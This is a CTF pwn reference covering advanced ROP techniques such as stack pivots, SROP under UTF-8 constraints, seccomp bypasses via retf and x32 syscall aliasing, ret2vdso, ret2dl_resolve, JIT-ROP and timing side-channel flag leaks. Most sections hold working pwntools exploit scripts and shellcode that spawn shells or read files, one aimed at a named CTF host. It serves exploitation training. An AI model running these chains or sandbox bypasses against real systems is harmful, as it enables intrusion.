# CTF Pwn - Advanced ROP Techniques

## Table of Contents
- [Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)](#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026)
- [SROP with UTF-8 Payload Constraints (DiceCTF 2026)](#srop-with-utf-8-payload-constraints-dicectf-2026)
- [Seccomp Bypass](#seccomp-bypass)
- [RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)](#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026)
- [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
- [.fini_array Hijack](#fini_array-hijack)
- [pwntools Template](#pwntools-template)
  - [Automated Offset Finding via Corefile (Crypto-Cat)](#automated-offset-finding-via-corefile-crypto-cat)
- [ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)](#ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go)
  - [Step 1 — Stack leak](#step-1--stack-leak)
  - [Step 2 — Write `/bin/sh` to known address](#step-2--write-binsh-to-known-address)
  - [Step 3 — Find vDSO base via AT_SYSINFO_EHDR](#step-3--find-vdso-base-via-at_sysinfo_ehdr)
  - [Step 4 — Dump vDSO and find gadgets](#step-4--dump-vdso-and-find-gadgets)
  - [Step 5 — execve ROP chain](#step-5--execve-rop-chain)
- [Vsyscall ROP for PIE Bypass (Hack.lu 2015)](#vsyscall-rop-for-pie-bypass-hacklu-2015)
- [x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)](#x32-abi-syscall-number-aliasing-for-seccomp-bypass-bctf-2017)
- [Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)](#time-based-blind-shellcode-when-write-blocked-def-con-2017)
- [JIT-ROP: Scan for syscall Byte in Leaked libc Function (Codegate 2018)](#jit-rop-scan-for-syscall-byte-in-leaked-libc-function-codegate-2018)
- [ret2dl_resolve 64-bit (Codegate 2018)](#ret2dl_resolve-64-bit-codegate-2018)
- [Prime-Only ROP via Goldbach Decomposition (PlaidCTF 2018)](#prime-only-rop-via-goldbach-decomposition-plaidctf-2018)
- [Imperfect-Gadget Stack Pivot (RITSEC 2018)](#imperfect-gadget-stack-pivot-ritsec-2018)
- [_fini_array Double-Entry Staged ROP (Insomnihack 2019)](#_fini_array-double-entry-staged-rop-insomnihack-2019)
- [ret2libc via Statically-Linked libc + Embedded /bin/sh String (TAMUctf 2019)](#ret2libc-via-statically-linked-libc--embedded-binsh-string-tamuctf-2019)
- [Useful Commands](#useful-commands)

For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).

---

## Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)

**Pattern (Eyeless):** Small stack overflow (22 bytes past buffer) — enough to overwrite RBP + RIP but too small for a ROP chain. No libc leak available. Use two `leave; ret` pivots to relocate execution to BSS, then chain `fgets` calls to write arbitrary-length ROP.

**Stage 1 — Pivot to BSS:**
```python
BSS_STAGE = 0x404500  # writable BSS address
LEAVE_RET = 0x4013d9  # leave; ret gadget

# Overflow: 128-byte buffer + RBP + RIP
payload = b'A' * 128
payload += p64(BSS_STAGE)   # overwrite RBP → BSS
payload += p64(LEAVE_RET)   # leave sets RSP = RBP (BSS), then ret
```

**Stage 2 — Chain fgets for large ROP:**
```python
# After pivot, RSP is at BSS_STAGE. Pre-place a mini-ROP there that
# calls fgets(BSS+0x600, 0x700, stdin) to read the real ROP chain:
POP_RDI = 0x4013a5
POP_RSI_R15 = 0x4013a3
SET_RDX_STDIN = 0x40136a  # gadget that sets rdx = stdin FILE*

stage2 = flat(
    SET_RDX_STDIN,
    POP_RDI, BSS_STAGE + 0x100,  # destination buffer
    POP_RSI_R15, 0x700, 0,       # size
    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
    BSS_STAGE + 0x100,            # return into the new ROP chain
)
```

**Key insight:** `leave; ret` is equivalent to `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls where RSP lands after `leave`. Two pivots solve the "too small for ROP" problem: first pivot moves to BSS where a small bootstrap ROP calls `fgets` to load the full exploit.

**When to use:** Overflow is too small for a full ROP chain AND the binary uses `fgets`/`read` (or similar input function) that can be called via PLT. BSS is always writable and at a known address (no PIE or PIE leaked).

---

## SROP with UTF-8 Payload Constraints (DiceCTF 2026)

**Pattern (Message Store):** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**

**Why SROP:** Normal ROP gadget addresses contain bytes >0x7f which are invalid single-byte UTF-8. SROP needs only 3 gadgets (set rax=15, call syscall) to trigger `sigreturn`, then a signal frame sets ALL registers for `execve("/bin/sh", NULL, NULL)`.

**UTF-8 multi-byte spanning trick:** Register fields in the signal frame are 8 bytes each, packed contiguously. A 3-byte UTF-8 sequence can start in one field and end in the next:

```python
from pwn import *

# r15 is the field immediately before rdi in the sigframe
# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F, ...]
# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq

# ROP preamble: 3 UTF-8-safe gadgets
payload = b'\x00' * 0x48           # padding to return address
payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
payload += p64(15)
payload += p64(syscall_ret)        # trigger sigreturn
payload += bytes(frame)
# Place "/bin/sh\0" at offset 0x178 in BUFFER
```

**When to use:** Any exploit where payload bytes pass through UTF-8 validation (Rust `String`, `from_utf8`, JSON parsers). SROP minimizes the number of gadget addresses that must be UTF-8-safe.

**Key insight:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in structured data (signal frames, ROP chains). Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`:
- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`

**Check rules:** `seccomp-tools dump ./binary`

See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.

## RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)

**Pattern (Eyeless):** Seccomp blocks `execve`, `execveat`, `open`, `openat` in 64-bit mode. Switch to 32-bit (IA-32e compatibility mode) where syscall numbers differ and the filter does not apply.

**How it works:** The `retf` (far return) instruction pops RIP then CS from the stack. Setting `CS = 0x23` switches the CPU to 32-bit compatibility mode. In 32-bit mode, `int 0x80` uses different syscall numbers: `open=5`, `read=3`, `write=4`, `exit=1`.

**ROP chain to switch modes:**
```python
POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
POP_RDI     = 0x4013a5
POP_RSI_R15 = 0x4013a3
RETF        = libc_base + 0x294bf   # retf gadget in libc

# Step 1: mprotect BSS as RWX for shellcode
rop  = flat(POP_RDI, 0x404000)          # addr = BSS page
rop += flat(POP_RSI_R15, 0x1000, 0)     # size = page
rop += flat(POP_RDX_RBX, 7, 0)          # prot = RWX
rop += flat(libc_base + libc.sym.mprotect)

# Step 2: Far return to 32-bit shellcode on BSS
rop += flat(RETF)
rop += p32(0x404a80)   # 32-bit EIP (shellcode address on BSS)
rop += p32(0x23)        # CS = 0x23 (IA-32e compatibility mode)
```

**32-bit shellcode (open/read/write flag):**
```nasm
mov esp, 0x404100       ; set up 32-bit stack
push 0x67616c66         ; "flag" (reversed)
push 0x2f2f2f2f         ; "////"
mov ebx, esp            ; ebx = filename pointer

mov eax, 5              ; SYS_open (32-bit)
xor ecx, ecx            ; O_RDONLY
int 0x80                ; open("////flag", O_RDONLY)

mov ebx, eax            ; fd from open
mov ecx, esp            ; buffer
mov edx, 0x100          ; size
mov eax, 3              ; SYS_read (32-bit)
int 0x80

mov edx, eax            ; bytes read
mov ecx, esp            ; buffer
mov ebx, 1              ; stdout
mov eax, 4              ; SYS_write (32-bit)
int 0x80

mov eax, 1              ; SYS_exit
int 0x80
```

**Key insight:** Seccomp filters configured for `AUDIT_ARCH_X86_64` do not check 32-bit `int 0x80` syscalls. The `retf` gadget (found in libc) switches architecture by loading CS=0x23. Requires making a memory region executable first via `mprotect`, since 32-bit shellcode must run from writable+executable memory.

**Finding retf in libc:**
```bash
ROPgadget --binary libc.so.6 | grep retf
# Or search for byte 0xcb:
objdump -d libc.so.6 | grep -w retf
```

**When to use:** Seccomp blocks critical 64-bit syscalls (`open`, `openat`, `execve`) but does not use `SECCOMP_FILTER_FLAG_SPEC_ALLOW` or check `AUDIT_ARCH`. Combine with `mprotect` to make BSS/heap executable for the 32-bit shellcode.

---

## Stack Shellcode with Input Reversal

**Pattern (Scarecode):** Binary reverses input buffer before returning.

**Strategy:**
1. Leak address via info-leak command (bypass PIE)
2. Find `sub rsp, 0x10; jmp *%rsp` gadget
3. Pre-reverse shellcode and RIP overwrite bytes
4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode

**Null-byte avoidance with `scanf("%s")`:**
- Can't embed `\x00` in payload
- Use partial pointer overwrite (6 bytes) -- top 2 bytes match since same mapping
- Use short jumps and NOP sleds instead of multi-address ROP chains

## .fini_array Hijack

**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO.

```python
# Find .fini_array address
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Or: objdump -h binary | grep fini_array

# Overwrite with format string %hn (2-byte writes)
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.

## pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

def conn():
    if args.GDB:
        return gdb.debug([exe], gdbscript='init-pwndbg\ncontinue')
    elif args.REMOTE:
        return remote('host', port)
    return process('./binary')

io = conn()
# exploit here
io.interactive()
```

### Automated Offset Finding via Corefile (Crypto-Cat)

Automatically determine buffer overflow offset without manual `cyclic -l`:
```python
def find_offset(exe):
    p = process(exe, level='warn')
    p.sendlineafter(b'>', cyclic(500))
    p.wait()
    # x64: read saved RIP from stack pointer
    offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    # x86: use pc directly
    # offset = cyclic_find(p.corefile.pc)
    log.warn(f'Offset: {offset}')
    return offset
```

**Key insight:** pwntools auto-generates a core file from the crashed process. Reading the saved return address from `corefile.sp` (x64) or `corefile.pc` (x86) and passing it to `cyclic_find()` gives the exact offset. Eliminates manual GDB inspection.

## ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)

**Pattern:** Statically-linked binary with minimal functions and zero useful ROP gadgets (no `pop rdi`, `pop rsi`, `pop rax`, etc.). The Linux kernel maps a vDSO (Virtual Dynamic Shared Object) into every process, and it contains enough gadgets for `execve`.

### Step 1 — Stack leak

Overflow a buffer and read back more bytes than sent to leak stack pointers:
```python
p.send(b'A' * 0x20)
resp = p.recv(0x80)
leak = u64(resp[0x30:0x38])
stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
```

### Step 2 — Write `/bin/sh` to known address

Use the binary's own `read` function via ROP to place `/bin/sh\0` at a page-aligned stack address:
```python
payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
p.sendline(payload)
p.send(b'/bin/sh\x00')
```

### Step 3 — Find vDSO base via AT_SYSINFO_EHDR

Dump the stack using the binary's `write` function. Search for `AT_SYSINFO_EHDR` (auxv type `0x21`) which holds the vDSO base address:
```python
# Dump 0x21000 bytes from stackbase
for i in range(0, len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:  # AT_SYSINFO_EHDR
        next_val = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
            vdso_base = next_val
            break
```

### Step 4 — Dump vDSO and find gadgets

Dump 0x2000 bytes from `vdso_base` using the binary's `write` function, then search for gadgets. Common vDSO gadgets:
```python
POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
```

### Step 5 — execve ROP chain

```python
payload = b'A' * 32
payload += p64(POP_RDX_RAX_RET)
payload += p64(0x0)              # rdx = NULL (envp)
payload += p64(59)               # rax = execve
payload += p64(POP_RBX_R12_RBP_RET)
payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
payload += p64(0x0)              # r12 → rsi = NULL (argv)
payload += p64(0xdeadbeef)       # rbp (dummy)
payload += p64(MOV_RDI_RBX_SYSCALL)
```

**Key insight:** The vDSO is kernel-specific — different kernels have different gadget offsets. Always dump the remote vDSO rather than assuming local offsets. The auxv `AT_SYSINFO_EHDR` (type 0x21) on the stack is the reliable way to find the vDSO base address.

**Detection:** Statically-linked binary with few functions, no libc, and no useful gadgets. QEMU-hosted challenges often run custom kernels with unique vDSO layouts.

---

## Vsyscall ROP for PIE Bypass (Hack.lu 2015)

On older Linux kernels, vsyscall page is mapped at a fixed address (`0xffffffffff600000-0xffffffffff601000`) regardless of ASLR/PIE. Each vsyscall entry ends with `ret`, providing gadgets at known addresses:

- `0xffffffffff600000` — gettimeofday (ret at +0x9)
- `0xffffffffff600400` — time (ret at +0x9)
- `0xffffffffff600800` — getcpu (ret at +0x9)

Use vsyscall `ret` gadgets to slide the stack to a partial return address overwrite:

```python
from pwn import *

payload = b'A' * 72                      # padding to return address
payload += p64(0xffffffffff600400)        # vsyscall time: acts as NOP-ret
payload += p64(0xffffffffff600400)        # second NOP-ret for alignment
payload += b"\x8b\x10"                    # partial overwrite to target (2 bytes)
```

**Key insight:** Vsyscall addresses are fixed even with PIE+ASLR. Modern kernels emulate vsyscalls (trap to kernel), but the addresses remain predictable. Check with `cat /proc/self/maps | grep vsyscall`.

**Note:** Some newer kernels disable vsyscall entirely (`vsyscall=none`). Verify availability before relying on this technique.

---

## x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)

**Pattern:** Linux x32 ABI (32-bit pointers on 64-bit kernel) uses syscall numbers with bit 30 set (`0x40000000`). Most seccomp BPF filters only check the low 32 bits against known syscall numbers, missing the x32 variants.

```c
// Standard execve blocked by seccomp: syscall 59
// x32 ABI variant: syscall 0x40000000 | 59 = 0x4000003B
// Often passes through BPF filters that check for exact match on 59
syscall(0x4000003B, "/bin/sh", NULL, NULL);
```

```python
from pwn import *

# ROP chain using x32 ABI syscall number to bypass seccomp
pop_rax = libc_base + rax_gadget
pop_rdi = libc_base + rdi_gadget
pop_rsi = libc_base + rsi_gadget
pop_rdx = libc_base + rdx_gadget
syscall_ret = libc_base + syscall_gadget

rop = flat(
    pop_rax, 0x4000003B,              # x32 execve (bypasses seccomp)
    pop_rdi, binsh_addr,              # "/bin/sh"
    pop_rsi, 0,                       # argv = NULL
    pop_rdx, 0,                       # envp = NULL
    syscall_ret,                      # trigger x32 execve
)
```

**Key insight:** The x32 ABI ORs `0x40000000` into syscall numbers. Seccomp filters checking for `SCMP_ACT_KILL` on `__NR_execve` (59) miss `__NR_execve | __X32_SYSCALL_BIT` (0x4000003B), which the kernel still dispatches to the same handler. This works on kernels compiled with `CONFIG_X86_X32=y` (common on older distributions).

**When to recognize:** Seccomp filter blocks specific syscall numbers via exact match or range check. Dump the BPF with `seccomp-tools dump ./binary` and check whether it validates the `AUDIT_ARCH` or masks off the x32 bit before comparing. If neither, x32 aliasing bypasses the filter.

**Mitigation check:** Modern seccomp policies use `SECCOMP_RET_KILL_PROCESS` and verify `AUDIT_ARCH_X86_64` explicitly, blocking this technique.

**References:** BCTF 2017

---

## Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)

**Pattern:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), use a timing side-channel to exfiltrate flag data character-by-character: compare each byte against a guess, loop on match.

```nasm
; Read flag into buffer, then compare character N
; Assumes flag has been read into rsi via allowed read() syscall
mov al, [rsi + N]      ; flag byte N
cmp al, 0x41           ; compare with guess 'A'
jne done               ; skip if no match
; Timing loop: burns ~4 seconds on match
xor ecx, ecx
.loop: inc ecx
cmp ecx, 0xffffffff
jne .loop
done: xor edi, edi
mov eax, 60            ; exit
syscall
```

```python
from pwn import *
import time

FLAG_LEN = 40
CHARSET = string.printable

def guess_byte(offset, guess_char):
    """Send shellcode that delays if flag[offset] == guess_char"""
    sc = shellcraft.amd64.linux.open("flag.txt", 0)
    sc += shellcraft.amd64.linux.read("rax", "rsp", 100)
    sc += f"""
        mov al, byte ptr [rsp + {offset}]
        cmp al, {ord(guess_char)}
        jne done
        xor ecx, ecx
    loop:
        inc ecx
        cmp ecx, 0xffffffff
        jne loop
    done:
        xor edi, edi
        mov eax, 60
        syscall
    """
    r = remote(host, port)
    r.send(asm(sc))
    start = time.time()
    try:
        r.recvall(timeout=6)
    except:
        pass
    elapsed = time.time() - start
    r.close()
    return elapsed > 3.0  # Match if response took > 3 seconds

flag = ""
for i in range(FLAG_LEN):
    for c in CHARSET:
        if guess_byte(i, c):
            flag += c
            print(f"Flag so far: {flag}")
            break
```

**Key insight:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), a flag byte can still be exfiltrated by comparing it against a guessed value and burning CPU time on match. The response time difference (instant vs ~4 seconds) reveals whether the guess was correct. Requires up to 256 * flag_length connections worst case, but printable ASCII reduces this to ~95 * flag_length.

**When to recognize:** Seccomp allows `open`/`read` but blocks all write-family syscalls. Also applicable when the binary has no output path at all (e.g., embedded systems, bare-metal challenges).

**References:** DEF CON 2017

---

## JIT-ROP: Scan for syscall Byte in Leaked libc Function (Codegate 2018)

**Pattern:** Instead of identifying the remote libc version to find gadgets, leak a GOT entry (e.g., `read@GOT`), then read the machine code of that function to find a `syscall` instruction within it. Use the `read()` return value to control `rax` for the syscall number.

**Exploitation:**
```python
from pwn import *

# Step 1: Leak read@GOT address via format string / arbitrary read
read_addr = leak_got(elf.got['read'])
log.info(f"read() @ {hex(read_addr)}")

# Step 2: Read bytes within read() function body
# Use an arbitrary read primitive (e.g., format string %s, or read() itself)
read_bytes = read_memory(read_addr, 0x100)

# Step 3: Find syscall opcode (0x0f 0x05) within read()
syscall_offset = read_bytes.index(b'\x0f\x05')
syscall_addr = read_addr + syscall_offset
log.info(f"syscall @ {hex(syscall_addr)}")

# Step 4: Overwrite an unused GOT entry (e.g., srand) with syscall address
write_got(elf.got['srand'], syscall_addr)

# Step 5: Build ROP chain for execve via syscall
# Trick: read() return value sets rax, so read exactly 59 bytes for __NR_execve
pop_rdi = rop_gadget  # pop rdi; ret
pop_rsi = rop_gadget  # pop rsi; ret
pop_rdx = rop_gadget  # pop rdx; ret

payload = flat(
    pop_rdi, 0,                    # fd = stdin
    pop_rsi, bss_addr,             # buf = writable BSS
    pop_rdx, 59,                   # count = 59 = __NR_execve
    elf.plt['read'],               # read(0, bss, 59) → rax = 59
    pop_rdi, binsh_addr,           # rdi = "/bin/sh"
    pop_rsi, 0,                    # rsi = NULL
    pop_rdx, 0,                    # rdx = NULL
    elf.plt['srand'],              # calls syscall (GOT overwritten)
    # rax=59, rdi="/bin/sh", rsi=0, rdx=0 → execve("/bin/sh", NULL, NULL)
)
io.sendline(payload)

# Send exactly 59 bytes so read() returns 59 (sets rax = __NR_execve)
io.send(b'A' * 59)
```

**Why read() always contains syscall:**
```text
read() in libc is a thin wrapper around the syscall instruction:
  mov eax, 0        ; SYS_read
  syscall            ; <-- this is what we're scanning for
  cmp rax, -4096
  ...
The bytes 0x0f 0x05 (syscall) are guaranteed to exist within read()
```

**Key insight:** Every libc function's code section contains useful gadgets. `read()` always contains a `syscall` instruction internally. By leaking a GOT entry and reading the function's machine code, you find `syscall` without knowing the libc version. The `read()` syscall return value conveniently sets `rax` to the number of bytes read — send exactly 59 bytes (`__NR_execve`) to set up the syscall number. This eliminates the need for a `pop rax; ret` gadget.

**When to recognize:** Partial RELRO (GOT writable), no libc version available, but you can leak GOT entries and read arbitrary memory. Any function that performs a syscall internally (`read`, `write`, `open`, `mmap`) contains the `0f 05` bytes. `read()` is preferred because its return value naturally controls `rax`.

**References:** Codegate 2018

---

## ret2dl_resolve 64-bit (Codegate 2018)

**Pattern:** Forge fake `Elf64_Rela`, `Elf64_Sym`, and dynstr entries in writable memory (BSS) to trick the dynamic linker into resolving an arbitrary libc function (e.g., `system`) without knowing the libc base address. The 64-bit variant requires bypassing VERSYM checks by NULLing the version table pointer in the link_map.

**How dynamic resolution works:**
```text
PLT stub → _dl_runtime_resolve(link_map, reloc_index)
  1. Look up Elf64_Rela at .rela.plt[reloc_index]
  2. Extract symbol index from r_info
  3. Look up Elf64_Sym at .dynsym[sym_index]
  4. Read symbol name from .dynstr + st_name offset
  5. Search loaded libraries for that symbol name
  6. [64-bit only] Check version via .gnu.version[sym_index]  ← must bypass
  7. Write resolved address to GOT, jump to it
```

**Forging the structures:**
```python
from pwn import *

# Target: resolve system() by forging resolution structures in BSS
BSS = 0x601000          # writable memory
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate offsets so forged structures are self-consistent
fake_rela_addr = BSS + 0x100
fake_sym_addr = BSS + 0x200
fake_str_addr = BSS + 0x300

# Forged Elf64_Sym (24 bytes)
# st_name: offset into dynstr where "system\x00" lives
# st_info: STT_FUNC | STB_GLOBAL
# st_other, st_shndx: 0
# st_value, st_size: 0 (unresolved)
sym_index = (fake_sym_addr - SYMTAB) // 24  # index into symtab
fake_sym = flat(
    p32(fake_str_addr - STRTAB),  # st_name (offset to "system" in dynstr)
    p8(0x12),                      # st_info = STT_FUNC | STB_GLOBAL<<4
    p8(0),                         # st_other
    p16(0),                        # st_shndx = SHN_UNDEF
    p64(0),                        # st_value
    p64(0),                        # st_size
)

# Forged Elf64_Rela (24 bytes)
# r_offset: GOT slot to write resolved address
# r_info: (sym_index << 32) | R_X86_64_JUMP_SLOT
# r_addend: 0
reloc_index = (fake_rela_addr - JMPREL) // 24
fake_rela = flat(
    p64(BSS + 0x400),                      # r_offset (writable GOT slot)
    p64((sym_index << 32) | 7),            # r_info: sym_idx | R_X86_64_JUMP_SLOT
    p64(0),                                 # r_addend
)

# Forged dynstr entry
fake_str = b"system\x00"

# Write all structures to BSS via ROP chain
# ...

# CRITICAL: Bypass VERSYM check for 64-bit
# Overwrite link_map->l_info[DT_VERSYM] with NULL
# This skips version validation entirely
# link_map address can be read from GOT[1]
link_map_addr = read_got(1)  # GOT[1] = link_map pointer
# l_info[DT_VERSYM] is at link_map + 0x1c8 (glibc-dependent)
versym_ptr = link_map_addr + 0x1c8
write_memory(versym_ptr, p64(0))  # NULL → skip version check

# Trigger resolution: call PLT stub with forged reloc_index
# _dl_runtime_resolve follows our forged chain:
#   fake Rela → fake Sym → fake dynstr "system"
#   → resolves system() → writes to fake GOT slot → jumps to system()
```

**ROP chain to trigger:**
```python
# After writing fake structures to BSS:
# Push reloc_index and jump to PLT[0] (the universal resolver stub)
plt_stub = elf.get_section_by_name('.plt').header.sh_addr

payload = flat(
    pop_rdi, binsh_addr,           # rdi = "/bin/sh" for system()
    plt_stub,                       # push link_map; jmp _dl_runtime_resolve
    p64(reloc_index),              # relocation index into forged .rela.plt
)
```

**Key insight:** 64-bit ret2dl_resolve is harder than 32-bit because of VERSYM checks. Overwrite `link_map->l_info[DT_VERSYM]` with NULL to skip version validation entirely. Then the standard approach works: forge Rela -> Sym -> dynstr chain in writable memory, trigger resolution via PLT stub with crafted reloc index. This resolves arbitrary libc functions without knowing the libc base — the dynamic linker does the work for you.

**When to recognize:** No libc leak available, Partial RELRO (PLT/GOT writable), binary has enough ROP gadgets to write to BSS and control function arguments. Works on any glibc version (the VERSYM bypass via NULL is universal). Prefer this over blind libc identification when the remote libc version is completely unknown.

**References:** Codegate 2018

---

## Prime-Only ROP via Goldbach Decomposition (PlaidCTF 2018)

**Pattern:** Challenge constrains every stack word written by the attacker to be a prime number (`miller_rabin(val)` must return true on each slot). Direct gadget addresses are almost never prime, so the ROP chain looks impossible to build.

**Exploit:** Goldbach's conjecture guarantees every even integer > 2 is the sum of two primes. Represent each target gadget address `g` as `g = p1 + p2` where `p1, p2` are primes, and write them into adjacent stack slots. A small "prime adder" gadget (`pop rax; pop rdx; add rax, rdx; push rax; ret` or a read-modify-write into the stack) consolidates the two halves into the real gadget pointer right before the `ret` that consumes it.

```python
from sympy import isprime, nextprime

def prime_split(addr):
    # Returns (p1, p2) with p1 + p2 == addr and both prime
    if addr % 2:  # odd: (2, addr-2) if addr-2 prime, else search
        if isprime(addr - 2): return (2, addr - 2)
    p1 = 3
    while not (isprime(p1) and isprime(addr - p1)):
        p1 = nextprime(p1)
    return (p1, addr - p1)
```

Chain multiple `(p1, p2, adder)` triples to synthesize arbitrary gadget addresses while every raw stack word still passes the primality filter.

**Key insight:** Number-theoretic constraints on stack contents can always be defeated by writing a value as the sum/XOR/product of admissible parts and adding a tiny reducer gadget that recombines them at runtime. Goldbach gives a constructive two-term decomposition for addresses; Lagrange's four-square theorem works similarly for constraints that require perfect squares.

**References:** PlaidCTF 2018 — writeup 10017

---

## Imperfect-Gadget Stack Pivot (RITSEC 2018)

**Pattern:** Classic stack pivots use `leave; ret` or `xchg esp, eax; ret`, but sometimes the only usable gadget has benign middle instructions. A gadget like `pop ebp; add al, 0x89; pop esp; and al, 0x30; add esp, 0x24; ret` still pivots `esp` — the `add al`/`and al` side effects do not corrupt `esp` and the trailing `add esp, 0x24` just skips 9 slots you pre-pad with junk.

```asm
0x80c0620: pop ebp ; add al, 0x89 ; pop esp ; and al, 0x30 ; add esp, 0x24 ; ret
```

Place a controlled heap address at the correct slot so `pop esp` lands you on a fake stack, then budget nine dummy dwords before the real chain to absorb `add esp, 0x24`.

**Key insight:** Stop rejecting gadgets because they are noisy. Walk each gadget line-by-line; if none of the instructions clobber `esp`, the gadget still pivots even with spurious arithmetic.

**References:** RITSEC CTF 2018 — Yet Another HR Management Framework, writeup 12287

---

## _fini_array Double-Entry Staged ROP (Insomnihack 2019)

**Pattern:** Statically-linked binary has no PLT/GOT to hijack. However, `_fini_array` stores pointers called on `exit()`. Overwrite both entries so the first invocation runs `do_overwrite` (a gadget that lets you stage more bytes) and the second runs it again, letting you append ROP piece-by-piece across successive exits.

```text
_fini_array[0] = do_overwrite   # stage 1: write next segment
_fini_array[1] = do_overwrite   # stage 2: write final segment + trigger
```

Use `add rsp, N; ret` pivots to walk below the current `rsp` so each stage concatenates onto the previous ROP frame.

**Key insight:** `_fini_array` is effectively a re-entrant callback table in static binaries. Two entries plus any "write N bytes to addr" primitive gives you unlimited ROP depth without restarting the process.

**References:** Insomnihack teaser 2019 — onewrite, writeup 12912

---

## ret2libc via Statically-Linked libc + Embedded /bin/sh String (TAMUctf 2019)

**Pattern (pwn5):** Argument is copied into a fixed-size buffer with a 3-character *display* limit — but the underlying `gets()` still reads the full line, yielding a stack overflow 17 bytes past the buffer. The overflow slot is too small for a multi-gadget ROP chain, and no obvious `/bin/sh` appears at predictable addresses. Because the binary is **statically linked**, `system`, `exit`, and an embedded `"/bin/sh"` string from the libc blob all live at fixed addresses — one ret2libc call fits in the overflow slot.

```python
from pwn import *

# Addresses resolved from the static binary itself:
#   (gdb) info address system  -> 0x0804ee30
#   (gdb) info address exit    -> 0x0804e330
#   0x080bc140: "/bin/sh"              (pulled from rodata / libc blob)

system  = 0x0804ee30
exit_a  = 0x0804e330
binsh   = 0x080bc140

# Overflow reaches saved EIP at cyclic offset 17 (cyclic -l on the crash)
payload  = cyclic(17)
payload += p32(system)   # ret -> system
payload += p32(exit_a)   # system's return addr -> exit (avoid SIGSEGV post-shell)
payload += p32(binsh)    # system's first arg

# Keep the process alive after the shell spawns by piping stdin:
# (python -c "..."; cat) | nc pwn.tamuctf.com 4325
io = remote('pwn.tamuctf.com', 4325)
io.sendline(payload)
io.interactive()
```

**Key insight:** Static linking turns every libc symbol into a fixed-offset target inside the binary and drags the entire libc string table (including `"/bin/sh"`) along for free — no leak, no ROPgadget hunting for `/bin/sh`, no dynamic linker games. Whenever `checksec` shows "No PIE" AND `file` reports "statically linked", a 12-byte payload (`system; exit; &/bin/sh`) is usually enough, even in overflow windows too small for a 2-gadget chain. Confirm by `strings -a binary | grep -n /bin/sh` and `nm binary | grep ' T system'`.

**References:** TAMUctf 2019 — pwn5, writeup 13428

---

## Useful Commands

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
```
